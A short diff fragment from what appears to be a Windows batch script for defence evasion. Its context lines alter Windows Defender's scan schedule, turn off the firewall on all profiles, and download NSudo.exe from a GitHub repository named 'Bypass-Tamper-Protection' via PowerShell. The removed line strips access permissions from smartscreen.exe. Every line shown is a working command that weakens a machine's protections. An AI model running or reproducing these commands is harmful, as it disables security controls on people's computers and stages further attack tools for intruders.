@@ -62,7 +62,6 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
-icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
 cd  %temp%
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
